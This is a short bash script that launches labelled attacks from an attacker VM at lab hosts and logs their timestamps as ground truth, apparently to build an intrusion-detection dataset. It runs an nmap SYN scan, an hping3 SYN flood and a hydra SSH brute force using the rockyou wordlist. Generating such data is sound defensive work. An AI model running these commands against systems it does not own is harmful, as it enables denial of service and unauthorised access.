#!/usr/bin/env bash
# Run on the ATTACKER VM. Only target machines YOU own (your lab VMs). Logs exact start/end epoch times = ground truth.
# usage: sudo ./run_attacks.sh <VICTIM_IP> <SSH_VICTIM_IP> [wordlist]
V="$1"; S="${2:-$1}"; WL="${3:-/usr/share/wordlists/rockyou.txt}"
MY_IP=$(ip route get "$V" | grep -oP 'src \K\S+')
LOG=events.log; : > "$LOG"
run() {  # run <type> <command...>
  local type="$1"; shift
  echo ">>> $type"; local t0=$(date +%s.%N)
  "$@"; local t1=$(date +%s.%N)
  echo "$type $MY_IP $t0 $t1" >> "$LOG"; sleep 20      # 20 s quiet gap between attacks
}
run port_scan      nmap -sS -p 1-1024 -T4 "$V"
run dos_syn_flood  timeout 10 hping3 -S -p 80 --flood "$V"
run ssh_bruteforce timeout 30 hydra -l testuser -P <(head -300 "$WL") -t 4 ssh://"$S"
cat "$LOG"
